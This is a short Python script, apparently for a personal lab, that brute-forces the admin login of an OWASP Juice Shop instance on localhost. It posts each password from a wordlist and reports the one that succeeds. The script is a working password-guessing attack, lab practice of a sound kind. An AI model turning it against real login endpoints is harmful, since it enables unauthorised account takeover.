import requests
import json
import time

target_url = "http://localhost:3000/rest/user/login"
username = "admin@juice-sh.op" # example for my own VM
wordlist_path = "/home/yigit/Desktop/test_wordlist.txt"

headers = {
    "Content-type": "application/json"
}

with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as file:
    for password in file: 
        password = password.strip()
        payload = {
            "email": username,
            "password": password
        }
        
        response = requests.post(target_url,headers=headers, data = json.dumps(payload))
        
        # A successful login usually contains 'authentication' object
        if response.status_code == 200 and "authentication" in response.text:
            print(f"[+] Password found: {password}")
            break
        else:
            print(f"[-] Tried password: {password}")
        
        time.sleep(1)  # To avoid overwhelming the server   